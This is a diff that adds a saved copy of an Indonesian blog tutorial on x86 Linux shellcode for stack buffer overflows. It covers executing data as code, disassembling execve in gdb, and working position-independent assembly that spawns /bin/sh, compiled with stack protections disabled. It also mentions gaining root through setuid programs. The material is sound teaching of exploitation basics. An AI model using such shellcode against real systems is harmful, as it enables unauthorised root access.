@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html xmlns:fb="http://www.facebook.com/2008/fbml"><head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="Shellcode_files/css.css" rel="stylesheet" type="text/css">
+<link rel="openid2.provider" href="https://www.google.com/accounts/o8/ud?source=profiles">
+<link rel="openid2.local_id" href="https://www.google.com/profiles/yohanes">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Shellcode</title>
+<link rel="icon" href="https://yohan.es/favicon.ico" type="image/x-icon">
+<link href="Shellcode_files/style.css" rel="stylesheet">
+<link href="Shellcode_files/bootstrap.css" rel="stylesheet">
+<style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+    </style>
+<link href="Shellcode_files/bootstrap-responsive.css" rel="stylesheet">
+<!--[if lt IE 9]>
+      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+<meta name="google-site-verification" content="nfHXplO1gBCV_4iGIfDjeOZ1vtNvV3JknSYms0ZdiHI">
+<script src="Shellcode_files/sdk_002.js" async="" crossorigin="anonymous"></script><script id="facebook-jssdk" src="Shellcode_files/sdk.js"></script><script type="text/javascript" async="" src="Shellcode_files/ga.js"></script><script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-28573496-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<script async="" src="Shellcode_files/lazysizes.html" type="text/javascript"></script>
+<style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
+.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://z-p3-static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://z-p3-static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://z-p3-static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://z-p3-static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://z-p3-static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://z-p3-static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://z-p3-static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}</style></head>
+<body>
+<div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div>
+<script type="text/javascript">(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3&appId=151853914827909";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+<div class="navbar navbar-inverse navbar-fixed-top">
+<div class="navbar-inner">
+<div class="container">
+<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</a>
+<a class="brand" href="https://yohan.es/">Yohan.es</a>
+<div class="nav-collapse collapse">
+<ul class="nav">
+<li><a href="https://yohan.es/applications/">My Apps</a></li>
+<li><a href="https://yohan.es/blackberry/">BlackBerry</a></li>
+<li><a href="https://yohan.es/android/">Android</a></li>
+<li><a href="https://yohan.es/playbook/">PlayBook</a></li>
+<li><a href="https://yohan.es/gadget/">Gadgets</a></li>
+</ul>
+<form action="https://yohan.es/search/" id="cse-search-box" class="navbar-form pull-right">
+<div>
+<input type="hidden" name="cx" value="partner-pub-2563024894235569:kg15mqcozdt">
+<input type="hidden" name="cof" value="FORID:10">
+<input type="hidden" name="ie" value="ISO-8859-1">
+<input type="text" name="q" size="31" style="background: rgb(255, 255, 255) url(&quot;https://www.google.com/cse/static/images/1x/googlelogo_lightgrey_46x16dp.png&quot;) no-repeat scroll left center; text-indent: 48px;" placeholder="Custom Search">
+<input type="submit" name="sa" value="Search" class="btn">
+</div>
+<input name="siteurl" type="hidden" value="yohan.es/security/buffer-overflow/shellcode/"><input name="ref" type="hidden" value="yohan.es/security/buffer-overflow/"><input name="ss" type="hidden"></form>
+</div>
+</div>
+</div>
+</div>
+
+<div class="container">
+
+<div id="content">
+<script type="text/javascript" src="Shellcode_files/brand"></script>
+
+<div id="page" style="padding-top: 0px;">
+<h1><a name="index1h1"></a>Shellcode</h1>
+<p>Di bagian sebelumnya, saya sudah membahas mengenai stack buffer 
+overflow, dan bagaimana ini bisa digunakan untuk mengalihkan eksekusi 
+program. Di bagian sebelumnya, fungsi yang akan dieksekusi sudah 
+tersedia sebelumnya. Berikutnya yang ingin kita lakukan adalah 
+mengeksekusi kode yang kita inginkan. Misalnya kode yang ingin kita 
+eksekusi bisa: menjalankan shell, membuat file, menghapus file, 
+mendengarkan koneksi jaringan, dsb. Jika kita melakukan sesuatu pada 
+program yang memiliki bug buffer overflow untuk melakukan aksi tertentu,
+ dikatakan kita mengeksploitasi buffer overflow pada program tersebut. 
+Atau singkatnya kita mengeksploit program tersebut. Eksploitasi Biasanya
+ ini dilakukan dengan program, dan program ini kita sebut sebagai <em>exploit.
+Kode </em>payload<em> yang melakukan aksi tertentu pada sebuah exploit ini disebut sebagai </em>shellcode*.</p>
+<p>Dalam bagian ini saya akan menggunakan konteks stack buffer overflow 
+untuk contoh shellcode. Pada bagian ini, arsitektur yang saya pakai 
+adalan Intel x86 32 bit, di OS Linux. Ada sebagian kecil di mana saya 
+membahas soal ARM (untuk menunjukkan perbedaan kode mesin).</p>
+<p>Artikel legendaris mengenai stack overflow ditulis oleh Aleph one (<a href="http://www.phrack.com/issues.html?issue=49&amp;id=14">http://www.phrack.com/issues.html?issue=49&amp;id=14</a>), saya akan menggunakan pendekatan yang berbeda darinya (meski sebagian mirip).</p>
+<p>Berikut ini urutan pembahasan yang akan saya lakukan:</p>
+<div class="toc">
+<ol>
+<li class="L2"><a href="#index1h2">Data adalah kode</a>
+</li>
+<li class="L2"><a href="#index2h2">Menaruh kode di stack</a>
+</li>
+<li class="L2"><a href="#index3h2">Position independent code</a>
+</li>
+<li class="L2"><a href="#index4h2">Contoh eksploitasi</a>
+</li>
+<li class="L2"><a href="#index5h2">Exploit yang reliable</a>
+</li>
+<li class="L2"><a href="#index6h2">Penutup</a>
+</li>
+</ol>
+</div>
+<h2><a name="index1h2"></a>Data adalah kode</h2>
+<p>Semua komputer yang kita pakai (desktop, mobile) memakai <a href="https://en.wikipedia.org/wiki/Von_Neumann_architecture">arsitektur Von Neumann</a> di mana data dan program tidak dibedakan. Sementara banyak microcontroller yang memakai <a href="https://en.wikipedia.org/wiki/Harvard_architecture">arsitektur Harvard</a>
+ di mana data dan program dipisahkan. Dalam artikel ini, saya hanya akan
+ membahas exploit pada komputer dengan arsitektur Von Neumann.</p>
+<p>Berikut ini contoh program untuk menunjukkan bahwa data adalah program.</p>
+<div class="highlight-c"><pre class="hl"><span class="hl ppc">#include &lt;stdio.h&gt;</span>
+<span class="hl ppc">#include &lt;stdlib.h&gt;</span>
+
+<span class="hl kwb">char</span> data<span class="hl opt">[]= {</span><span class="hl num">0xc3</span><span class="hl opt">};</span>
+<span class="hl kwb">char</span> data2<span class="hl opt">[] = {</span> <span class="hl num">0xb8</span><span class="hl opt">,</span> <span class="hl num">0x2a</span><span class="hl opt">,</span> <span class="hl num">0x00</span><span class="hl opt">,</span> <span class="hl num">0x00</span><span class="hl opt">,</span> <span class="hl num">0x00</span><span class="hl opt">,</span> <span class="hl num">0xc3</span><span class="hl opt">};</span>
+
+<span class="hl kwb">void</span> <span class="hl opt">(*</span>f<span class="hl opt">)(</span><span class="hl kwb">void</span><span class="hl opt">);</span>
+<span class="hl kwb">int</span> <span class="hl opt">(*</span>g<span class="hl opt">)(</span><span class="hl kwb">void</span><span class="hl opt">);</span>
+
+<span class="hl kwb">int</span> <span class="hl kwd">main</span><span class="hl opt">()</span>
+<span class="hl opt">{</span>
+    f <span class="hl opt">=</span> data<span class="hl opt">;</span>
+    <span class="hl kwd">f</span><span class="hl opt">();</span>
+    g <span class="hl opt">=</span> data2<span class="hl opt">;</span>
+    <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"g = %d</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> <span class="hl kwd">g</span><span class="hl opt">());</span>
+    <span class="hl kwa">return</span> <span class="hl num">0</span><span class="hl opt">;</span>
+<span class="hl opt">}</span>
+</pre></div>
+<p>Compile program tersebut dengan <code>gcc -fno-stack-protector -z execstack -o data-as-code data-as-code.c</code>. Opsi <code>-fno-stack-protector</code> digunakan untuk mematikan opsi proteksi stack, dan opsi <code>-z execstack</code>
+ diperlukan agar kita bisa mengeksekusi kode di bagian data. Prosessor 
+Intel yang lama selalu mengasumsikan bahwa data sama dengan kode, namun 
+di prosessor baru, ada bit bernama NX (non executable) yang bisa diset 
+agar data tidak boleh dieksekusi (demi security). Output program 
+tersebut adalah:</p>
+<pre><code> g = 42
+</code></pre>
+<p>Variabel <code>f</code> dan <code>g</code> keduanya adalah <em>pointer to function</em>. Variabel <code>f</code>
+ yang merupakan pointer ke fungsi yang tidak menerima parameter apa-apa 
+dan tidak mengembalikan apa-apa (void) diassign agar menunjuk ke 
+variabel <code>data</code> yang merupakan <em>array of char</em>. Sedangkan <code>g</code> dmerupakan fungsi yang mengembalikan integer, dan diassign agar menunjuk ke variabel <code>data2</code> yang juga merupakan <em>array of char</em>.</p>
+<p>Ketika <em>pointer to function</em> <code>f</code> dipanggil, maka kode di dalam variabel <code>data</code> dieksekusi. Kode 0xc3 merepresentasikan instruksi <code>ret</code> (<em>return</em>) dalam assembly, jadi fungsi <code>f</code> tidak melakukan apa-apa (sekedar contoh fungsi pliang sederhana). Sementara <code>data2</code> mengandung kode untuk mengembalikan nilai 42. Ini bisa kita lihat dengan <code>objdump -D namafile</code>:</p>
+<pre><code> Disassembly of section .data:
+
+ 00000000 &lt;data&gt;:
+    0:   c3                      ret
+
+ 00000001 &lt;data2&gt;:
+    1:   b8 2a 00 00 00          mov    $0x2a,%eax
+    6:   c3                      ret
+</code></pre>
+<p>Untuk prosessor ARM, gunakan kode berikut untuk menggantikan <code>data</code> dan <code>data2</code>:</p>
+<div class="highlight-c"><pre class="hl"><span class="hl kwb">char</span> data<span class="hl opt">[]= {</span>
+     <span class="hl num">0x0e</span><span class="hl opt">,</span> <span class="hl num">0xf0</span><span class="hl opt">,</span> <span class="hl num">0xa0</span><span class="hl opt">,</span> <span class="hl num">0xe1</span> <span class="hl slc">// mov     pc, lr</span>
+     <span class="hl opt">};</span>
+
+<span class="hl kwb">char</span> data2<span class="hl opt">[] = {</span>
+     <span class="hl num">0x2a</span><span class="hl opt">,</span> <span class="hl num">0x00</span><span class="hl opt">,</span> <span class="hl num">0xa0</span><span class="hl opt">,</span> <span class="hl num">0xe3</span><span class="hl opt">,</span> <span class="hl slc">// mov     r0, #42</span>
+     <span class="hl num">0x0e</span><span class="hl opt">,</span> <span class="hl num">0xf0</span><span class="hl opt">,</span> <span class="hl num">0xa0</span><span class="hl opt">,</span> <span class="hl num">0xe1</span><span class="hl opt">,</span> <span class="hl slc">// mov     pc, lr</span>
+<span class="hl opt">};</span>
+</pre></div>
+<p>Perhatikan bahwa kode bahasa mesin berbeda antara satu prosessor dengan prosessor lainnnya.</p>
+<h2><a name="index2h2"></a>Menaruh kode di stack</h2>
+<p>Dalam artikel bagian sebelumnya, saya mengeset alamat kembalian ke 
+sebuah fungsi lain. Alamat apapun bisa diberikan, termasuk juga alamat 
+memori di stack. Ingat bahwa data bisa diinterpretasi sebagai kode. Jika
+ kita bisa memasukkan kode ke stack, maka kita bisa melompat ke alamat 
+itu di stack. Ada dua hal yang akan saya bahas: Pertama kita ingin 
+memiliki kode yang akan dieksekusi. Bagian kedua: kita ingin agar bisa 
+mengeksekusi kode tersebut.</p>
+<h3><a name="index1h3"></a>Dari C ke kode mesin</h3>
+<p>Kita bisa menulis kode apa saja, tapi biasanya yang kita inginkan adalah menjalankan <em>shell</em>, yang biasanya adalah <code>/bin/sh</code>. Jika kita mengeksploitasi program yang memiliki bit <code>setuid</code>
+ root, maka shell yang dijalankan akan memiliki akses root. Untuk Anda 
+yang mahir assembly, menulis kode dalam assembly sangat mudah. Bagaimana
+ jika Anda masih kurang mahir assembly? Anda bisa mengubah bahasa C ke 
+kode bahasa mesin dengan <code>gcc</code> dan <code>objdump</code>. Gunakan opsi <code>-Os</code> untuk mendapatkan kode assembly sekecil mungkin, atau <code>-O3</code> untuk mendapatkan kode seoptimal mungkin.</p>
+<div class="highlight-c"><pre class="hl"><span class="hl ppc">#include &lt;stdio.h&gt;</span>
+
+<span class="hl kwb">char</span> <span class="hl opt">*</span>name<span class="hl opt">[</span><span class="hl num">2</span><span class="hl opt">] = {</span><span class="hl str">"/bin/sh"</span><span class="hl opt">,</span> <span class="hl num">0</span><span class="hl opt">};</span>
+
+<span class="hl kwb">void</span> <span class="hl kwd">main</span><span class="hl opt">() {</span>
+   <span class="hl kwd">execve</span><span class="hl opt">(</span>name<span class="hl opt">[</span><span class="hl num">0</span><span class="hl opt">],</span> name<span class="hl opt">,</span> NULL<span class="hl opt">);</span>
+<span class="hl opt">}</span>
+</pre></div>
+<p>Pertama kita lihat bagaimana fungsi main dikompilasi</p>
+<pre><code> yohanes@development:~$ gdb ./a.out
+ GNU gdb 6.8-debian
+ Copyright (C) 2008 Free Software Foundation, Inc.
+ License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+ This is free software: you are free to change and redistribute it.
+ There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+ and "show warranty" for details.
+ This GDB was configured as "i486-linux-gnu"...
+ (gdb) disas main
+ Dump of assembler code for function main:
+ 0x08048230 &lt;main+0&gt;:    push   %ebp
+ 0x08048231 &lt;main+1&gt;:    mov    %esp,%ebp
+ 0x08048233 &lt;main+3&gt;:    and    $0xfffffff0,%esp
+ 0x08048236 &lt;main+6&gt;:    sub    $0x10,%esp
+ 0x08048239 &lt;main+9&gt;:    mov    0x80c7588,%eax
+ 0x0804823e &lt;main+14&gt;:   movl   $0x0,0x8(%esp)
+ 0x08048246 &lt;main+22&gt;:   movl   $0x80c7588,0x4(%esp)
+ 0x0804824e &lt;main+30&gt;:   mov    %eax,(%esp)
+ 0x08048251 &lt;main+33&gt;:   call   0x804e630 &lt;execve&gt;
+ 0x08048256 &lt;main+38&gt;:   leave
+ 0x08048257 &lt;main+39&gt;:   ret
+ End of assembler dump.
+</code></pre>
+<p>Beberapa baris yang penting adalah:</p>
+<pre><code> 0x08048239 &lt;main+9&gt;:    mov    0x80c7588,%eax
+ 0x0804823e &lt;main+14&gt;:   movl   $0x0,0x8(%esp)
+ 0x08048246 &lt;main+22&gt;:   movl   $0x80c7588,0x4(%esp)
+ 0x0804824e &lt;main+30&gt;:   mov    %eax,(%esp)
+ 0x08048251 &lt;main+33&gt;:   call   0x804e630 &lt;execve&gt;
+</code></pre>
+<p>Kita periksa alamat 0x80c7588</p>
+<pre><code>(gdb) x 0x80c7588
+0x80c7588 &lt;name&gt;:       0x080aa1a8
+</code></pre>
+<p>Ternyata isinya variabel <code>name</code>, yang tipenya adalah <code>char **</code>. Kita bisa melihat isinya <code>name[0]</code>:</p>
+<pre><code>(gdb) x/s ((char**)0x80c7588)[0]
+0x80aa1a8:       "/bin/sh"
+</code></pre>
+<p>Instruksi-instruksi tersebut ekivalen dengan :</p>
+<pre><code>push 0
+push &lt;alamat name[0]&gt;
+push &lt;alamat name&gt;
+call execve
+</code></pre>
+<p>Sekarang apa yang terjadi di fungsi <code>execve</code>?</p>
+<pre><code> (gdb) disas execve
+ Dump of assembler code for function execve:
+ 0x0804e630 &lt;execve+0&gt;:  push   %ebp
+ 0x0804e631 &lt;execve+1&gt;:  mov    %esp,%ebp
+ 0x0804e633 &lt;execve+3&gt;:  mov    0x10(%ebp),%edx
+ 0x0804e636 &lt;execve+6&gt;:  push   %ebx
+ 0x0804e637 &lt;execve+7&gt;:  mov    0xc(%ebp),%ecx
+ 0x0804e63a &lt;execve+10&gt;: mov    0x8(%ebp),%ebx
+ 0x0804e63d &lt;execve+13&gt;: mov    $0xb,%eax
+ 0x0804e642 &lt;execve+18&gt;: int    $0x80
+ 0x0804e644 &lt;execve+20&gt;: mov    %eax,%edx
+ 0x0804e646 &lt;execve+22&gt;: cmp    $0xfffff000,%edx
+ 0x0804e64c &lt;execve+28&gt;: ja     0x804e651 &lt;execve+33&gt;
+ 0x0804e64e &lt;execve+30&gt;: pop    %ebx
+ 0x0804e64f &lt;execve+31&gt;: pop    %ebp
+ 0x0804e650 &lt;execve+32&gt;: ret
+ 0x0804e651 &lt;execve+33&gt;: mov    $0xffffffe8,%eax
+ 0x0804e656 &lt;execve+38&gt;: neg    %edx
+ 0x0804e658 &lt;execve+40&gt;: mov    %edx,%gs:(%eax)
+ 0x0804e65b &lt;execve+43&gt;: mov    $0xffffffff,%eax
+ 0x0804e660 &lt;execve+48&gt;: jmp    0x804e64e &lt;execve+30&gt;
+ End of assembler dump.
+</code></pre>
+<p>Baris yang penting adalah:</p>
+<pre><code> 0x0804e633 &lt;execve+3&gt;:  mov    0x10(%ebp),%edx -&gt; param 2
+ 0x0804e636 &lt;execve+6&gt;:  push   %ebx
+ 0x0804e637 &lt;execve+7&gt;:  mov    0xc(%ebp),%ecx -&gt; param 1
+ 0x0804e63a &lt;execve+10&gt;: mov    0x8(%ebp),%ebx -&gt; param 0
+ 0x0804e63d &lt;execve+13&gt;: mov    $0xb,%eax
+ 0x0804e642 &lt;execve+18&gt;: int    $0x80
+</code></pre>
+<p>Instruksi <code>int $0x80</code> merupakan instruksi untuk melakukan <code>syscall</code> pada Linux x86 (32 bit). System call (<code>syscall</code>)
+ merupakan cara suatu program meminta layanan dari sistem operasi. 
+Singkatnya: ini memungkinan program memanggil fungsi kernel. Biasanya 
+sebagai programmer aplikasi, kita tidak perlu tahu tentang <code>syscall</code>,
+ karena ini berbeda di tiap OS. Programmer aplikasi biasanya akan 
+memanggil fungsi di librar C, dan library itu yang akan memetakan sebuah
+ fungsi (misalnya <code>open</code>) dengan <code>syscall</code> yang bersesuaian untuk OS tersebut.</p>
+<p>Di Linux x86, parameter ke kernel diberikan melalui register. 
+Register EAX = nomor fungsi syscall (0x0b = 11 desimal adalah syscall 
+untuk <code>execve</code>). Register ebx, ecx, edx berturut merupakan parameter pertama, kedua dan ketiga untuk <code>syscall</code>.</p>
+<h2><a name="index3h2"></a>Position independent code</h2>
+<p>Jika fungsi <code>main</code> dan fungsi <code>execve</code> digabung, maka untuk melakukan eksekusi shell:</p>
+<pre><code>mov &lt;alamat name&gt;, %ebx
+mov &lt;alamat name[0]&gt;, %ecx
+mov $0, %edx
+mov $0xb, %eax
+int $0x80
+</code></pre>
+<p>Tapi ada beberapa masalah dengan kode tersebut: kode tersebut tidak mengandung isi variabel <code>name</code>, dan kita belum tahu alamat <code>name</code>.
+ Kita tidak bisa menggunakan alamat konstan, karena kode ini akan 
+diinjeksikan ke lokasi stack yang (biasanya) tidak kita ketahui 
+alamatnya. Kita menginginkan kode yang bisa dieksekusi, tidak tergantung
+ pada alamat memori tempat kode tersebut berada, ini disebut sebagai <em>position independent code</em>.</p>
+<p>Strategi kita adalah sebagai berikut: kita letakkan string <code>/bin/sh</code> setelah kode program (setelah <code>int $0x80</code>), lalu kita akan berusaha mencari alamatnya dengan teknik <code>call</code> lalu <code>pop</code>. Teknik ini sederhana:</p>
+<p>Nah sekarang <code>%eax</code> berisi alamat x. Mengapa bisa begitu? ketika <code>call x</code> dipanggil, alamat instruksi berikutnya setelah <code>call x</code> adalah <code>pop %eax</code> dan nilai tersebut di <code>push</code> ke stack. Ketika di-<code>pop</code>, kita mendapatkan alamat instruksi <code>pop %eax</code> saat ini di memori. Sekarang kita bisa menaruh string "/bin/sh" setelah kode kita:</p>
+<pre><code>         call start
+ start:  pop %eax
+         add N, %eax               -&gt; N adalah jumlah byte dari start sampai name[0]
+         mov %eax, %ecx            -&gt; sekarang %ecx berisi alamat name[0]
+     sub 8, %eax               -&gt; mundur 8 byte
+     mov %eax, (%ecx)
+         mov %eax, %ebx
+         xor %edx, %edx
+         mov $0xb, %eax
+         int $0x80
+        "/bin/sh\0"                -&gt; string dengan terminasi NUL ('\0')
+name[0]: &lt;alamat "/bin/sh"&gt;        -&gt; ukurannya 4 byte
+name[1]:  0                        -&gt; ukurannya 4 byte
+</code></pre>
+<blockquote><p>Catatan: NUL (satu L) adalah nama karakter dalam ASCII 
+yang kodenya adalah 0. NULL (dua L) adalah pointer yang menunjuk alamat 
+0x0.</p></blockquote>
+<p>Mari kita coba kode tersebut:</p>
+<div class="highlight-c"><pre class="hl"><span class="hl ppc">#include &lt;stdio.h&gt;</span>
+
+<span class="hl kwb">void</span> <span class="hl kwd">shell</span><span class="hl opt">()</span>
+<span class="hl opt">{</span>
+        __asm__ <span class="hl kwc">volatile</span> <span class="hl opt">(</span>
+             <span class="hl str">"call .start</span> <span class="hl esc">\n</span><span class="hl str">"</span>
+
+             <span class="hl str">".start:</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"pop  %eax</span> <span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"addl  $(.names-.start), %eax</span> <span class="hl esc">\n</span><span class="hl str">"</span>              <span class="hl slc">//N adalah jumlah byte dari start sampai name[0]</span>
+             <span class="hl str">"mov  %eax, %ecx</span><span class="hl esc">\n</span><span class="hl str">"</span>            <span class="hl slc">// sekarang %ecx berisi alamat name[0]</span>
+             <span class="hl str">"subl $8, %eax</span><span class="hl esc">\n</span><span class="hl str">"</span>               <span class="hl slc">// mundur 8 byte</span>
+             <span class="hl str">"movl %eax, (%ecx)</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"movl %eax, %ebx</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"xorl %edx, %edx</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"movl $11, %eax</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"int $0x80</span><span class="hl esc">\n</span><span class="hl str">"</span>
+              <span class="hl str">".string</span> <span class="hl esc">\"</span><span class="hl str">/bin/sh</span><span class="hl esc">\" \n</span><span class="hl str">"</span> <span class="hl slc">//               -&gt; string</span>
+             <span class="hl str">".names:"</span>
+             <span class="hl str">".long 0</span><span class="hl esc">\n</span><span class="hl str">"</span> <span class="hl slc">//         -&gt; ukurannya 4 byte</span>
+             <span class="hl str">".long 0</span><span class="hl esc">\n</span><span class="hl str">"</span> <span class="hl slc">//                        -&gt; ukurannya 4 byte</span>
+             <span class="hl opt">);</span>
+<span class="hl opt">}</span>
+
+<span class="hl ppc">#define CODE_SIZE 48</span>
+
+<span class="hl kwb">char</span> data<span class="hl opt">[</span>CODE_SIZE<span class="hl opt">];</span>
+
+<span class="hl kwb">void</span> <span class="hl opt">(*</span>myshell<span class="hl opt">)(</span><span class="hl kwb">void</span><span class="hl opt">);</span>
+
+<span class="hl kwb">int</span> <span class="hl kwd">main</span><span class="hl opt">()</span>
+<span class="hl opt">{</span>
+        <span class="hl kwd">memcpy</span><span class="hl opt">(</span>data<span class="hl opt">,</span> shell<span class="hl opt">,</span> CODE_SIZE<span class="hl opt">);</span>
+        <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"myshell</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">);</span>
+        myshell <span class="hl opt">=</span> data<span class="hl opt">;</span>
+        <span class="hl kwd">myshell</span><span class="hl opt">();</span>
+        <span class="hl kwa">return</span> <span class="hl num">0</span><span class="hl opt">;</span>
+<span class="hl opt">}</span>
+</pre></div>
+<p>Compile program tersebut dengan:</p>
+<pre><code>gcc -fomit-frame-pointer -g -fno-stack-protector -z execstack shell-1.c
+</code></pre>
+<p>Opsi <code>-fomit-frame-pointer</code> akan menyebabkan gcc tidak menghasilkan prolog dan epilog fungsi (<code>push %ebp</code>, <code>mov %esp, %ebp</code>, dsb), agar kode assembly yang kita buat di fungsi <code>shell</code> tidak diberi tambahan apa-apa.</p>
